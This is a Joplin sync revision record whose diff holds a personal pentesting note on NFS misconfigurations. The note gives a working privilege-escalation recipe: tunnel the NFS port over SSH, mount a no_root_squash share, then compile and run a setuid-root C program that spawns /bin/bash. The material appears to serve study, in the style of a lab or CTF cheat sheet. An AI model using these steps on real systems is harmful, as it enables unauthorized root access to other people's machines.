id: 20cd5702df5f4070a7626ac32fde683f
parent_id: 
item_type: 1
item_id: 5c154102202a4bc2810ada55f25852e7
item_updated_time: 1642323843363
title_diff: "[{\"diffs\":[[1,\"NFS Vulns\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":9}]"
body_diff: "[{\"diffs\":[[1,\"<ins>Vulnerabilities</ins>\\\n\\\n[https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no\\\\_root\\\\_squash-misconfiguration-pe](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)\\\n\\\nRead the /etc/exports file, if you find some directory that is configured as no\\\\_root\\\\_squash, then you can access it from as a client and write inside that directory as if you were the local root of the machine.\\\n\\\nno\\\\_root\\\\_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.\\\n\\\nno\\\\_all\\\\_squash: This is similar to no\\\\_root\\\\_squash option but applies to non-root users. Imagine, you have a shell as nobody user; checked /etc/exports file; no\\\\_all\\\\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.\\\n\\\n<ins>NFS; no\\\\_root\\\\_squash, insecure, rw</ins>\\\n\\\nIf /etc/exports have a line e.g.\\\n\\\n> /srv/pelota 192.168.42.0/24(insecure,rw)\\\n> /srv/pelota 127.0.0.1/32(no\\\\_root\\\\_squash,insecure,rw)\\\n\\\nThen NFS is being exported and you have ssh access to the machine. You can use your attacker machine (login as root) to run:\\\n\\\n> ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049\\\n> mount -t nfs 127.0.0.1:/srv/pelota my_share\\\n> cd my_share\\\n> cat > shell.c<<EOF\\\n> #include &lt;unistd.h&gt;\\\n> int main(){\\\n> setuid(0);\\\n> setgid(0);\\\n> system(\\\"/bin/bash\\\");\\\n> }\\\n> EOF\\\n> gcc shell.c -o shell\\\n> chmod u+s shell\\\n\\\nNow inside a ssh session on the victim machine i.e. 192.168.42.32 in this case\\\n\\\n> cd /srv/pelota\\\n> ./shell\\\n> \\\n> Use 'id' to identify what user you are\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":1730}]"
metadata_diff: {"new":{"id":"5c154102202a4bc2810ada55f25852e7","parent_id":"27b595c9aae647aba407fed241a81f90","latitude":"1.36730000","longitude":"103.80140000","altitude":"0.0000","author":"","source_url":"","is_todo":0,"todo_due":0,"todo_completed":0,"source":"joplin-desktop","source_application":"net.cozic.joplin-desktop","application_data":"","order":0,"markup_language":1,"is_shared":0,"share_id":"","conflict_original_id":"","master_key_id":""},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-01-16T09:05:29.319Z
created_time: 2022-01-16T09:05:29.319Z
type_: 13